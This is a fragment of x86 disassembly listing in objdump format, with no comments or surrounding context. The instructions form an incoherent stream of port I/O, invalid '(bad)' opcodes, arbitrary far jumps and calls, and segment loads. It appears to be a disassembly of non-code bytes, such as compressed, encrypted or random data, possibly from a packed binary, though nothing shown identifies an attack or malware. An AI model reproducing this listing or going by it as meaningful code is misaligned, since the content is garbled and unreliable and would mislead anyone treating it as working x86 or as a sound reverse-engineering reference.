  41eed3:	out    0x74,eax
  41eed5:	jp     0x41ef17
  41eed7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eed8:	jno    0x41ee6f
  41eeda:	jno    0x41ee82
  41eedc:	jb     0x41ee77
  41eede:	retf   
  41eedf:	add    DWORD PTR [eax],0x6
  41eee2:	in     al,0xbf
  41eee4:	xor    esi,DWORD PTR [ecx]
  41eee6:	xor    DWORD PTR [ebp+0x273e493f],0x28
  41eeed:	or     dl,BYTE PTR [eax]
  41eeef:	pushf  
  41eef0:	adc    BYTE PTR [ecx],cl
  41eef2:	xlat   BYTE PTR ds:[ebx]
  41eef3:	xchg   edi,eax
  41eef4:	adc    eax,0x2d532cfb
  41eef9:	xor    edi,0x53805d40
  41eeff:	frstor [ebx+0x7009ab89]
  41ef05:	add    al,0xfa
  41ef07:	stos   DWORD PTR es:[edi],eax
  41ef08:	and    DWORD PTR [edi],eax
  41ef0a:	stos   BYTE PTR es:[edi],al
  41ef0b:	lds    ebx,FWORD PTR [edx-0x33]
  41ef0e:	pop    esp
  41ef0f:	loope  0x41eeac
  41ef11:	sar    ecx,0x14
  41ef14:	mov    ah,0x54
  41ef16:	sbb    eax,DWORD PTR [ecx+0x7b]
  41ef19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef1a:	dec    eax
  41ef1b:	loope  0x41eed7
  41ef1d:	lods   eax,DWORD PTR ds:[esi]
  41ef1e:	dec    eax
  41ef1f:	pop    ebx
  41ef20:	ja     0x41ef7e
  41ef22:	aas    
  41ef23:	push   cs
  41ef24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef25:	xor    eax,0xb3e51437
  41ef2a:	cmovae esi,DWORD PTR ds:0x9f85ab7
  41ef31:	(bad)
  41ef34:	push   0x439c2cbd
  41ef39:	jbe    0x41ef48
  41ef3b:	in     al,dx
  41ef3c:	leave  
  41ef3d:	or     eax,0xecb943cc
  41ef42:	push   0x7b
  41ef44:	push   edx
  41ef45:	arpl   WORD PTR [esi+eax*8-0x353f39be],cx
  41ef4c:	adc    al,BYTE PTR [ecx]
  41ef4e:	jg     0x41ef6f
  41ef50:	pop    ebp
  41ef51:	push   0x94fd1a94
  41ef56:	pop    edi
  41ef57:	push   ss
  41ef58:	push   0xb52c3348
  41ef5d:	test   BYTE PTR [ebp+0x3b],dl
  41ef60:	mov    eax,0xe9464c86
  41ef65:	jl     0x41ef38
  41ef67:	dec    edx
  41ef68:	arpl   bx,cx
  41ef6a:	jb     0x41eef5
  41ef6c:	mov    cl,0x21
  41ef6e:	stc    
  41ef6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef70:	jnp    0x41ef0d
  41ef72:	rol    BYTE PTR [ebp+0x30],1
  41ef75:	sub    eax,0x47b83478
  41ef7a:	repz daa 
  41ef7c:	das    
  41ef7d:	pusha  
  41ef7e:	mov    gs,WORD PTR [esp+ebx*4]
  41ef81:	xchg   edx,eax
  41ef82:	adc    BYTE PTR [edi+0x57979009],bl
  41ef88:	xchg   edi,eax
  41ef89:	or     eax,0xe096cfab
  41ef8e:	mov    esi,0xb28791e7
  41ef93:	adc    bl,BYTE PTR [ebp-0x5ed32247]
  41ef99:	repz pop edx
  41ef9b:	push   ds
  41ef9c:	stc    
  41ef9d:	stos   DWORD PTR es:[edi],eax
  41ef9e:	push   0x96fd9c87
  41efa3:	sub    BYTE PTR [ecx+0x22a415a2],bl
  41efa9:	ret    
  41efaa:	sub    al,0x27
  41efac:	mov    edx,0xed5f8e6f
  41efb1:	sub    DWORD PTR [esi+0x4fe19144],0xaaedf432
  41efbb:	inc    ebx
  41efbc:	jp     0x41ef8c
  41efbe:	cmp    al,BYTE PTR [ebx]
  41efc0:	dec    edx
  41efc1:	cli    
  41efc2:	out    dx,eax
  41efc3:	and    eax,0xf9fe53dc
  41efc8:	mov    ah,0xe5
  41efca:	fs mov eax,edx
  41efcd:	jae    0x41f020
  41efcf:	out    0x1b,eax
  41efd1:	cwde   
  41efd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41efd3:	cmp    BYTE PTR [ecx+0x6a63b9af],ch
  41efd9:	imul   ecx,esp,0x50
  41efdc:	xchg   ebp,eax
  41efdd:	fdivr  QWORD PTR [ecx-0x42d5eaef]
  41efe3:	add    al,0xb
  41efe5:	mov    eax,ds:0xf00782f6
  41efea:	xchg   edx,eax
  41efeb:	iret   
  41efec:	jne    0x41f03e
  41efee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41efef:	cmp    dl,BYTE PTR [ebx]
  41eff1:	sbb    esp,DWORD PTR [ecx]
  41eff3:	loop   0x41efa7
  41eff5:	scas   eax,DWORD PTR es:[edi]
  41eff6:	in     eax,0xd8
  41eff8:	xor    al,0xb7
  41effa:	mov    cl,0x85
  41effc:	in     eax,dx
  41effd:	inc    DWORD PTR [ebp+0x24]
  41f000:	imul   esp,eax,0xb611bcdb
  41f006:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f007:	adc    BYTE PTR ds:0xcda6e7ad,cl
  41f00d:	les    esi,FWORD PTR [ebp+0x2c5c0b19]
  41f013:	es mov al,0xc8
  41f016:	gs call 0x347590d9
  41f01c:	ss in  eax,dx
  41f01e:	rcr    DWORD PTR [eax-0x6f],cl
  41f021:	cmp    bl,BYTE PTR [ecx]
  41f023:	fstp   QWORD PTR [eax-0x1691936c]
  41f029:	mov    ebp,0x6d128d4a
  41f02e:	(bad)  
  41f02f:	pop    edx
  41f030:	xor    DWORD PTR [esi],ebp
  41f032:	loope  0x41f07c
  41f034:	dec    edi
  41f035:	mul    BYTE PTR [ebx]
  41f037:	popf   
  41f038:	ficom  WORD PTR [eax+0x131dd290]
  41f03e:	(bad)  [edx+0x4a]
  41f041:	lds    edi,FWORD PTR [edx+0x58]
  41f044:	xor    al,0xc2
  41f046:	mov    dh,0x9b
  41f048:	mov    al,0x68
  41f04a:	fsub   QWORD PTR [esi]
  41f04c:	aam    0x11
  41f04e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f04f:	xor    BYTE PTR [eax+edi*2-0x2cd44d31],bl
  41f056:	dec    esp
  41f057:	pop    ecx
  41f058:	push   cs
  41f059:	stos   DWORD PTR es:[edi],eax
  41f05a:	adc    bl,BYTE PTR [eax+0x3d]
  41f05d:	pusha  
  41f05e:	xor    eax,0x11a59a52
  41f063:	jae    0x41f096
  41f065:	dec    ecx
  41f066:	into   
  41f067:	xor    eax,0x62da2184
  41f06c:	sub    DWORD PTR [esi-0x50],edi
  41f06f:	pop    edi
  41f070:	fdiv   QWORD PTR [edx]
  41f072:	test   DWORD PTR [ebx-0x62690f79],0xca489ff
  41f07c:	sar    DWORD PTR [edx+eax*4-0x36],0xe7
  41f081:	in     al,dx
  41f082:	iret   
  41f083:	jo     0x41f06a
  41f085:	gs mov edx,0x239651e0
  41f08b:	lods   al,BYTE PTR ds:[esi]
  41f08c:	adc    eax,DWORD PTR [ebx+0x52aac1ec]
  41f092:	das    
  41f093:	jle    0x41f019
  41f095:	and    DWORD PTR [eax+0x7f60daea],edi
  41f09b:	in     al,dx
  41f09c:	sub    eax,0x666a7d67
  41f0a1:	jl     0x41f115
  41f0a3:	mov    ebx,0xd5f7bc2e
  41f0a8:	ror    DWORD PTR [ecx+edi*1+0x30],cl
  41f0ac:	ror    bl,cl
  41f0ae:	jecxz  0x41f127
  41f0b0:	in     eax,dx
  41f0b1:	into   
  41f0b2:	pop    ebx
  41f0b3:	jmp    0x41f0f6
  41f0b5:	pop    ebx
  41f0b6:	stos   BYTE PTR es:[edi],al
  41f0b7:	dec    edi
  41f0b8:	jg     0x41f132
  41f0ba:	dec    ebp
  41f0bb:	test   al,0x97
  41f0bd:	push   ss
  41f0be:	ins    BYTE PTR es:[edi],dx
  41f0bf:	mov    bl,0xdf
  41f0c1:	popf   
  41f0c2:	pop    edx
  41f0c3:	loope  0x41f13b
  41f0c5:	and    ch,0x27
  41f0c8:	mov    bl,0x12
  41f0ca:	dec    esi
  41f0cb:	sbb    BYTE PTR [esi+0x27856c8c],dh
  41f0d1:	lods   eax,DWORD PTR ds:[esi]
  41f0d2:	inc    ecx
  41f0d3:	cmp    eax,0xc4f91f30
  41f0d8:	sar    DWORD PTR [edi+0x34f73c04],1
  41f0de:	xlat   BYTE PTR ds:[ebx]
  41f0df:	mov    cl,0xd8
  41f0e1:	aad    0xc7
  41f0e3:	stc    
  41f0e4:	add    ch,BYTE PTR [ebp-0x66128c68]
  41f0ea:	and    DWORD PTR [edi+0x50],ebx
  41f0ed:	inc    eax
  41f0ee:	push   ebp
  41f0ef:	std    
  41f0f0:	sub    esp,ebp
  41f0f2:	outs   dx,BYTE PTR ds:[esi]
  41f0f3:	push   es
  41f0f4:	es test esi,edx
  41f0f7:	lods   al,BYTE PTR ds:[esi]
  41f0f8:	shr    BYTE PTR [eax+0xae1706],1
  41f0fe:	cmp    BYTE PTR [edi+0x1f],cl
  41f101:	xlat   BYTE PTR ds:[ebx]
  41f102:	adc    al,0x74
  41f104:	fstp   QWORD PTR [ebp-0x269656e5]
  41f10a:	cdq    
  41f10b:	pop    ds
  41f10c:	pushf  
  41f10d:	cmp    al,0xd9
  41f10f:	loope  0x41f0f6
  41f111:	inc    esp
  41f112:	imul   ecx,DWORD PTR [edx-0x129d9b45],0x43926cbd
  41f11c:	pop    eax
  41f11d:	cli    
  41f11e:	adc    BYTE PTR [edx-0x49],bh
  41f121:	push   0x3c64826b
  41f126:	daa    
  41f127:	push   ss
  41f128:	push   esi
  41f129:	ret    
  41f12a:	cmp    eax,0x98469c08
  41f12f:	xor    DWORD PTR [ebx],esi
  41f131:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f132:	dec    ebp
  41f133:	xor    ah,BYTE PTR [ebp+0x4f97a635]
  41f139:	jns    0x41f0bd
  41f13b:	(bad)  
  41f13c:	cmp    ecx,DWORD PTR [eax]
  41f13e:	push   esi
  41f13f:	lods   al,BYTE PTR ds:[esi]
  41f140:	cmp    al,0x66
  41f142:	mov    al,ds:0xc4fe03cc
  41f147:	pusha  
  41f148:	mov    edi,0x70bf83cc
  41f14d:	lods   al,BYTE PTR ds:[esi]
  41f14e:	pop    edx
  41f14f:	daa    
  41f150:	mov    eax,ds:0xb6ec3c8f
  41f155:	mov    eax,ds:0x6d3ea405
  41f15a:	mov    es,WORD PTR [edx]
  41f15c:	push   esi
  41f15d:	dec    edi
  41f15e:	lods   ax,WORD PTR ds:[esi]
  41f160:	mov    BYTE PTR [esi+edi*8+0x50],ah
  41f164:	mov    al,ds:0x5155401c
  41f169:	mov    esi,0xd3fc3b44
  41f16e:	inc    DWORD PTR [esi+0x79b0c795]
  41f174:	and    ebp,DWORD PTR [edi-0x7cf02435]
  41f17a:	pop    esp
  41f17b:	jmp    0x724a:0x312a8510
  41f182:	adc    BYTE PTR [eax+ebx*1-0x180045bc],dh
  41f189:	imul   edx,DWORD PTR [esp+ecx*8-0xd],0xc58f74ce
  41f191:	adc    al,0x10
  41f193:	in     eax,dx
  41f194:	imul   edx,ebx,0xffffffbc
  41f197:	jmp    edi
  41f199:	call   0xfc362054
  41f19e:	or     eax,0x7343f070
  41f1a3:	xor    bh,BYTE PTR [edi-0x6]
  41f1a6:	(bad)  
  41f1a7:	lea    esp,[ebx]
  41f1a9:	jmp    0xd366:0x3c918032
  41f1b0:	jecxz  0x41f197
  41f1b2:	lock outs dx,BYTE PTR ds:[esi]
  41f1b4:	xchg   ebx,eax
  41f1b5:	cdq    
  41f1b6:	ret    
  41f1b7:	mov    ah,BYTE PTR [edx-0x1e8cdd4]
  41f1bd:	mov    ds:0x6c3313da,al
  41f1c2:	shl    cl,cl
  41f1c4:	sbb    esi,DWORD PTR [esi+0x1eb924a3]
  41f1ca:	dec    edi
  41f1cb:	stc    
  41f1cc:	popa   
  41f1cd:	or     BYTE PTR [ecx],al
  41f1cf:	nop
  41f1d0:	mov    al,BYTE PTR [ebp-0x51409a7a]
  41f1d6:	xlat   BYTE PTR ds:[ebx]
  41f1d7:	or     al,0xba
  41f1d9:	je     0x41f212
  41f1db:	das    
  41f1dc:	and    DWORD PTR [edi],esi
  41f1de:	aam    0x93
  41f1e0:	add    BYTE PTR [esi],bh
  41f1e2:	ffreep st(6)
  41f1e4:	xchg   ebp,eax
  41f1e5:	sar    DWORD PTR [edx-0x4618115f],cl
  41f1eb:	das    
  41f1ec:	jmp    0x256643b6
  41f1f1:	cmp    esp,ebx
  41f1f3:	and    bl,cl
  41f1f5:	push   esp
  41f1f6:	or     eax,0x3dcc2f9e
  41f1fb:	data16 (bad) 
  41f1fe:	mov    ds:0xf9f3f427,al
  41f203:	fcom   QWORD PTR [ecx]
  41f205:	cmp    ecx,DWORD PTR [edi]
  41f207:	or     ebx,esi
  41f209:	test   DWORD PTR [esi],0xf3c817b5
  41f20f:	aas    
  41f210:	add    ah,al
  41f212:	jae    0x41f26c
  41f214:	push   0x71b7dc95
  41f219:	shl    BYTE PTR [ebx+0x7a3b124],0x6d
  41f220:	imul   edi,DWORD PTR [ebp+0x53],0x985fc1ed
  41f227:	leave  
  41f228:	imul   edi,DWORD PTR [ebp+0x67],0xffffffb2
  41f22c:	mov    ecx,0xa9fb4589
  41f231:	inc    DWORD PTR [esi]
  41f233:	jno    0x41f1d0
  41f235:	call   0xe3b8:0x45308bfe
  41f23c:	sbb    DWORD PTR ds:0x3b39f512,esp
  41f242:	ja     0x41f1fa
  41f244:	adc    ch,BYTE PTR [esi-0xc0aa788]
  41f24a:	adc    ebx,DWORD PTR ds:0x3faba6d6
  41f250:	aaa    
  41f251:	test   al,0x6d
  41f253:	pop    ds
  41f254:	push   es
  41f255:	lahf   
  41f256:	inc    esp
  41f257:	es cs inc esp
  41f25a:	bound  edi,QWORD PTR ds:[eax]
  41f25d:	imul   ecx,DWORD PTR [ecx+0x30bb17dc],0x4103f5c3
  41f267:	push   esp
  41f268:	xchg   ebp,eax
  41f269:	add    eax,0xca085791
  41f26e:	pop    edx
  41f26f:	dec    esp
  41f270:	sar    ebp,0x66
  41f273:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f274:	arpl   WORD PTR [eax-0x3bcfb2b2],bx
  41f27a:	shr    DWORD PTR [ecx-0x38d74a30],0x84
  41f281:	pop    ecx
  41f282:	rol    cl,0x1a
  41f285:	mov    al,ds:0x10111f99
  41f28a:	mov    edx,0x5ffc1b93
  41f28f:	call   0xa06a1daa
  41f294:	or     BYTE PTR [ebp-0x31],ch
  41f297:	or     BYTE PTR [ecx-0x20],bl
  41f29a:	call   0x79ca5877
  41f29f:	es push ebp
  41f2a1:	sbb    esi,ebx
  41f2a3:	cwde   
  41f2a4:	out    0x29,eax
  41f2a6:	sbb    al,0x4a
  41f2a8:	mov    ebx,0xc8f8ebbf
  41f2ad:	aad    0x8e
  41f2af:	xchg   DWORD PTR [ebx],edi
  41f2b1:	popa   
  41f2b2:	sub    ecx,0x5a
  41f2b5:	sbb    eax,0x1807977d
  41f2ba:	push   ecx
  41f2bb:	cmp    dl,BYTE PTR [ebx-0x6d]
  41f2be:	xchg   esp,eax
  41f2bf:	pop    eax
  41f2c0:	mov    ebp,0xc6e42c7d
  41f2c5:	adc    esp,DWORD PTR [eax+edx*8-0x130b640]
  41f2cc:	aad    0x4f
  41f2ce:	pushf  
  41f2cf:	push   edx
  41f2d0:	(bad)  
  41f2d1:	or     ecx,DWORD PTR [esi-0x4f]
  41f2d4:	cmp    eax,0x296d5941
  41f2d9:	dec    ebx
  41f2da:	inc    ecx
  41f2db:	pop    eax
  41f2dc:	push   0xffffff9b
  41f2de:	sbb    al,cl
  41f2e0:	pop    ss
  41f2e1:	push   cs
  41f2e2:	pop    ecx
  41f2e3:	sub    DWORD PTR [ecx+0x63f03e63],ecx
  41f2e9:	fcmovbe st,st(1)
  41f2eb:	mov    ds:0xa157aec4,al
  41f2f0:	mov    ds:0xaf6f527e,al
  41f2f5:	mov    eax,gs
  41f2f7:	pop    esi
  41f2f8:	jne    0x41f356
  41f2fa:	setp   BYTE PTR [edx-0x3a94e7d5]
  41f301:	push   ecx
  41f302:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f303:	xchg   ebp,eax
  41f304:	lea    edi,[edx+edx*4-0x7486af7f]
  41f30b:	dec    ebx
  41f30c:	lock dec esp
  41f30e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f30f:	inc    esi
  41f310:	fisttp DWORD PTR [esi]
  41f312:	(bad)  [edi]
  41f314:	jbe    0x41f2e1
  41f316:	mov    edx,0xfd6a48ad
  41f31b:	xlat   BYTE PTR ds:[ebx]
  41f31c:	xchg   DWORD PTR [edi],esp
  41f31e:	je     0x41f2aa
  41f320:	xchg   BYTE PTR [ebx-0x1e],bh
  41f323:	retf   0x853c
  41f326:	mov    BYTE PTR [esi-0x38],ch
  41f329:	es je  0x41f323
  41f32c:	add    BYTE PTR [esi+ecx*1+0x2dd4a6c8],dl
  41f333:	and    eax,0x624cba4
  41f338:	bound  esp,QWORD PTR [edx+0x27]
  41f33b:	jle    0x41f3aa
  41f33d:	(bad)  
  41f33e:	mov    ebx,0x148f0e28
  41f343:	mov    dl,0x93
  41f345:	jecxz  0x41f3c0
  41f347:	pop    edx
  41f348:	cld    
  41f349:	pop    esi
  41f34a:	sbb    dh,BYTE PTR [eax-0x13]
  41f34d:	fwait
  41f34e:	pop    ebx
  41f34f:	push   0x7c
  41f351:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f352:	sub    DWORD PTR [ebx],ebx
  41f354:	adc    BYTE PTR [ebx],bh
  41f356:	icebp  
  41f357:	xchg   DWORD PTR [eax],edx
  41f359:	sub    BYTE PTR [eax-0x279732eb],dl
  41f35f:	inc    esi
  41f360:	dec    edi
  41f361:	call   0xdf9f:0x1154b0e9
  41f368:	or     DWORD PTR [ebx-0x4f],ecx
  41f36b:	pop    ds
  41f36c:	mov    dl,0x46
  41f36e:	and    BYTE PTR [esi+ebp*4],bl
  41f371:	gs jp  0x41f3e9
  41f374:	test   al,0xf2
  41f376:	outs   dx,DWORD PTR ds:[esi]
  41f377:	jl     0x41f33d
  41f379:	aas    
  41f37a:	imul   ebx,ebp,0x29e9151
  41f380:	dec    esp
  41f381:	je     0x41f36d
  41f383:	outs   dx,DWORD PTR ds:[esi]
  41f384:	jbe    0x41f315
  41f386:	xchg   edx,eax
  41f387:	scas   eax,DWORD PTR es:[edi]
  41f388:	and    al,0x83
  41f38a:	add    DWORD PTR [eax],ebx
  41f38c:	rep lods al,BYTE PTR ds:[esi]
  41f38e:	fistp  DWORD PTR [esi]
  41f390:	sbb    cl,dl
  41f392:	out    0x8f,al
  41f394:	adc    esp,esp
  41f396:	pop    esi
  41f398:	test   al,0x8
  41f39a:	lea    ebx,[ecx+esi*1]
  41f39d:	rol    BYTE PTR [edi+0x55],1
  41f3a0:	enter  0xd49,0xe6
  41f3a4:	bound  esi,QWORD PTR [edi-0x71]
  41f3a7:	rol    BYTE PTR [edi],1
  41f3a9:	iret   
  41f3aa:	popa   
  41f3ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f3ac:	imul   edx,DWORD PTR [ebx],0x11
  41f3af:	test   BYTE PTR [ebp+0x62f4a4f3],bh
  41f3b5:	cs jmp 0x41f37c
  41f3b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f3b9:	add    dl,bh
  41f3bb:	or     BYTE PTR [edx+0x48],ch
  41f3be:	test   BYTE PTR [edi-0x58355818],cl
  41f3c4:	xor    eax,0x9a7c29f
  41f3c9:	and    DWORD PTR [edx],0xf43f05ea
  41f3cf:	mov    eax,0x2c8459f7
  41f3d4:	adc    al,0xf2
  41f3d6:	adc    BYTE PTR [ebx-0x322943e5],ch
  41f3dc:	outs   dx,BYTE PTR ds:[esi]
  41f3dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f3de:	fsubr  QWORD PTR [edi+0x3]
  41f3e1:	leave  
  41f3e2:	mov    al,ds:0x71179f45
  41f3e7:	fdivr  DWORD PTR [ecx-0x55]
  41f3ea:	seto   BYTE PTR [ecx-0x7d32ed50]
  41f3f1:	adc    cl,BYTE PTR [eax]
  41f3f3:	jne    0x41f411
  41f3f5:	into   
  41f3f6:	mov    edx,0x4bb17bd6
  41f3fb:	jle    0x41f3f8
  41f3fd:	in     al,0xaf
  41f3ff:	cmp    ah,BYTE PTR [ebx+edi*4+0x45f8aad8]
  41f406:	and    al,0x2d
  41f408:	mov    ebx,DWORD PTR [edx]
  41f40a:	dec    esp
  41f40b:	add    ah,bh
  41f40d:	jnp    0x41f412
  41f40f:	sbb    eax,0xa8f7e2c4
  41f414:	gs pop ecx
  41f416:	pop    esi
  41f417:	clc    
  41f418:	jae    0x41f3d4
  41f41a:	mov    ch,0x29
  41f41c:	std    
  41f41d:	icebp  
  41f41e:	dec    edx
  41f41f:	test   BYTE PTR [eax],al
  41f421:	push   eax
  41f422:	mov    ah,0x35
  41f424:	sti    
  41f425:	or     DWORD PTR [ecx+0xce37927],0x51cbfe11
  41f42f:	push   0xda5ad2a6
  41f434:	sar    BYTE PTR [esi+0x5a],1
  41f437:	sbb    DWORD PTR [edi+0x75ef14c2],0xffffffac
  41f43e:	pop    ss
  41f43f:	out    dx,al
  41f440:	xchg   ecx,eax
  41f441:	jne    0x41f46a
  41f443:	sub    eax,0x6bfdfb2c
  41f448:	inc    esi
  41f449:	es loope 0x41f451
  41f44c:	fs cli 
  41f44e:	stos   BYTE PTR es:[edi],al
  41f44f:	cmc    
  41f450:	cmp    DWORD PTR [edi],0x68
  41f453:	repz cld 
  41f455:	jle    0x41f3e1
  41f457:	mov    bl,0x83
  41f459:	dec    edx
  41f45a:	push   esp
  41f45b:	or     DWORD PTR [edi+0x50],ebx
  41f45e:	adc    BYTE PTR [eax+0xb],dl
  41f461:	add    ecx,DWORD PTR [ebx-0x64dc7973]
  41f467:	or     ebx,DWORD PTR [edx+0x64]
  41f46a:	imul   DWORD PTR [ecx+ecx*4-0x33]
  41f46e:	xor    eax,0x69e152bb
  41f473:	pop    eax
  41f474:	dec    esp
  41f475:	shl    DWORD PTR [ecx+eiz*4],cl
  41f478:	test   DWORD PTR [ecx+0x25],edi
  41f47b:	push   esi
  41f47c:	dec    esp
  41f47d:	ja     0x41f473
  41f47f:	mov    dl,0xde
  41f481:	mov    al,0x9b
  41f483:	dec    eax
  41f484:	aam    0xe7
  41f486:	out    dx,eax
  41f487:	pop    esp
  41f488:	retf   
  41f489:	call   0x9315:0x3d7120f3
  41f490:	dec    esi
  41f491:	pop    edx
  41f492:	fist   DWORD PTR [ebp+0x6f1e9ae2]
  41f498:	jg     0x41f4eb
  41f49a:	mov    ebx,eax
  41f49c:	lods   al,BYTE PTR ds:[esi]
  41f49d:	test   cl,bh
  41f49f:	or     eax,DWORD PTR [edi+0x505c01fd]
  41f4a5:	in     eax,dx
  41f4a6:	add    DWORD PTR [ecx+0x72],edi
  41f4a9:	lock out 0x26,al
  41f4ac:	fild   WORD PTR [eax+ebp*8-0x26f78ed8]
  41f4b3:	jmp    0xac74:0x628ef6e9
  41f4ba:	mov    al,BYTE PTR [eax+esi*8+0x4b581086]
  41f4c1:	pushf  
  41f4c2:	add    BYTE PTR [esp+ecx*8],bl
  41f4c5:	jmp    0x41f449
  41f4c7:	in     eax,dx
  41f4c8:	in     al,dx
  41f4c9:	adc    DWORD PTR [edx+ebx*1],0x991de2f7
  41f4d0:	iret   
  41f4d1:	je     0x41f485
  41f4d3:	add    esp,DWORD PTR ds:0x30d8df1c
  41f4d9:	jg     0x41f4d9
  41f4db:	imul   BYTE PTR [esi+esi*2+0x2357d22e]
  41f4e2:	leave  
  41f4e3:	ins    DWORD PTR es:[edi],dx
  41f4e4:	mov    BYTE PTR [ebp+ebx*2+0x11b9911f],dl
  41f4eb:	sub    al,0x23
  41f4ed:	lds    ebx,FWORD PTR [esp+eiz*2]
  41f4f0:	jns    0x41f4c9
  41f4f2:	xor    ch,ch
  41f4f4:	loop   0x41f507
  41f4f6:	sbb    bl,BYTE PTR [ecx-0x7da099b1]
  41f4fc:	xchg   DWORD PTR [edx-0x70731e38],ecx
  41f502:	outs   dx,DWORD PTR ds:[esi]
  41f503:	push   ss
  41f504:	pop    ebp
  41f505:	inc    edx
  41f506:	inc    edi
  41f507:	inc    DWORD PTR [eax]
  41f509:	xchg   ecx,eax
  41f50a:	adc    eax,0xc9022183
  41f50f:	clc    
  41f510:	jo     0x41f4dd
  41f512:	fist   DWORD PTR [ecx+esi*1]
  41f515:	and    dl,BYTE PTR [ecx+0x35bd18ed]
  41f51b:	outs   dx,BYTE PTR ds:[esi]
  41f51c:	sub    al,0x79
  41f51e:	mov    ch,0x26
  41f520:	lds    edi,FWORD PTR [esi]
  41f522:	push   eax
  41f523:	cmp    al,0x95
  41f525:	call   0xfb0d152a
  41f52a:	out    dx,eax
  41f52b:	jg     0x41f56b
  41f52d:	or     DWORD PTR [edx],ebp
  41f52f:	push   esi
  41f530:	jle    0x41f567
  41f532:	out    0x3c,al
  41f534:	popa   
  41f535:	pop    ds
  41f536:	pop    ebx
  41f537:	push   ds
  41f538:	scas   eax,DWORD PTR es:[edi]
  41f539:	jl     0x41f57a
  41f53b:	push   edx
  41f53c:	jecxz  0x41f56e
  41f53e:	add    ebp,DWORD PTR cs:[ebx+0x2]
  41f542:	out    0xf0,eax
  41f544:	mov    dl,0x31
  41f546:	adc    eax,0xa492c301
  41f54b:	dec    eax
  41f54c:	shl    DWORD PTR [esp+ebx*2],1
  41f54f:	lds    eax,FWORD PTR [ebx+eax*1+0x2b2fd0b2]
  41f556:	out    dx,al
  41f557:	je     0x41f50c
  41f559:	and    al,0xbb
  41f55b:	fbld   TBYTE PTR [ebp-0x212e0902]
  41f561:	ds push esi
  41f563:	sbb    eax,0x492e5de
  41f568:	movs   BYTE PTR es:[di],BYTE PTR cs:[si]
  41f56b:	loopne 0x41f507
  41f56d:	sbb    bh,BYTE PTR [ebp-0x4b3bc3d0]
  41f573:	scas   al,BYTE PTR es:[edi]
  41f574:	pop    esi
  41f575:	xchg   DWORD PTR [ebp+0x34],eax
  41f578:	mov    ebx,0x8c2ba96c
  41f57d:	jbe    0x41f564
  41f57f:	cmp    cl,dl
  41f581:	push   eax
  41f582:	jb     0x41f56c
  41f584:	sub    cl,BYTE PTR [edi]
  41f586:	and    al,0x17
  41f588:	xchg   edi,eax
  41f589:	jmp    DWORD PTR [eax-0xd48dd61]
  41f58f:	mov    al,BYTE PTR gs:[edi-0x62]
  41f593:	xchg   esp,eax
  41f594:	addr16 inc edx
  41f596:	pop    edi
  41f597:	pop    esp
  41f598:	mov    ch,0xc0
  41f59a:	mov    edx,0xdfc79c3c
  41f59f:	mov    WORD PTR [esi+0x60],ds
  41f5a2:	repz mov cl,0xac
  41f5a5:	retf   0x4585
  41f5a8:	add    eax,0xd1af5daa
  41f5ad:	cld    
  41f5ae:	push   edx
  41f5af:	das    
  41f5b0:	pop    ss
  41f5b1:	test   al,0x8
  41f5b3:	cli    
  41f5b4:	aas    
  41f5b5:	rcr    DWORD PTR [ebp-0x6c],0x2c
  41f5b9:	jmp    0x41f5ce
  41f5bb:	mov    eax,0xdcc78b39
  41f5c0:	cmc    
  41f5c1:	pop    ecx
  41f5c2:	sbb    bl,BYTE PTR [ebx-0x8]
  41f5c5:	xor    al,0xae
  41f5c7:	data16 cmc 
  41f5c9:	lds    eax,FWORD PTR [ecx+0x1b58ca0c]
  41f5cf:	add    DWORD PTR [edx+0xb],esp
  41f5d2:	dec    ebx
  41f5d3:	pop    ebp
  41f5d4:	pop    WORD PTR [edi]
  41f5d7:	inc    ebp
  41f5d8:	jmp    0xc0f9:0xe184ea4b
  41f5df:	arpl   di,ax
  41f5e1:	es jecxz 0x41f5ba
  41f5e4:	cmp    DWORD PTR [eax-0x4b],esi
  41f5e7:	repz jmp 0x41f5d7
  41f5ea:	cmp    al,0xf0
  41f5ec:	cdq    
  41f5ed:	push   edx
  41f5ee:	stos   DWORD PTR es:[edi],eax
  41f5ef:	jge    0x41f661
  41f5f1:	mov    al,ds:0xe13cafcc
  41f5f6:	sub    edi,DWORD PTR [edx]
  41f5f8:	or     eax,DWORD PTR [ebx+0x10186efd]
  41f5fe:	sbb    eax,0xad485e1d
  41f603:	(bad)  
  41f604:	mov    es,WORD PTR ds:0x1c8baac0
  41f60a:	outs   dx,DWORD PTR ds:[esi]
  41f60b:	jno    0x41f5d2
  41f60d:	add    DWORD PTR [edx-0x4206c7],esi
  41f613:	mov    bh,0xd1
  41f615:	pusha  
  41f616:	dec    edx
  41f617:	pop    es
  41f618:	lods   al,BYTE PTR ds:[esi]
  41f619:	inc    eax
  41f61a:	and    DWORD PTR [ecx],0xffffffb2
  41f61d:	push   0xffffff89
  41f61f:	outs   dx,BYTE PTR ds:[esi]
  41f620:	mov    eax,ds:0x3a0b2370
  41f625:	mov    ecx,0xd39bed20
  41f62a:	xchg   esp,eax
  41f62c:	inc    esp
  41f62d:	das    
  41f62e:	shr    ecx,1
  41f630:	in     eax,dx
  41f631:	inc    ebp
  41f632:	dec    edi
  41f633:	add    edi,DWORD PTR [esi+0x66]
  41f636:	mov    edi,0x2b0f50bc
  41f63b:	lds    ecx,FWORD PTR [edx]
  41f63d:	arpl   si,cx
  41f63f:	dec    esi
  41f640:	out    0x22,eax
  41f642:	sbb    eax,0xd909eb5f
  41f647:	mov    ecx,0x2d4b3b83
  41f64c:	xchg   edi,eax
  41f64d:	ins    BYTE PTR es:[edi],dx
  41f64e:	ds jae 0x41f626
  41f651:	test   al,dh
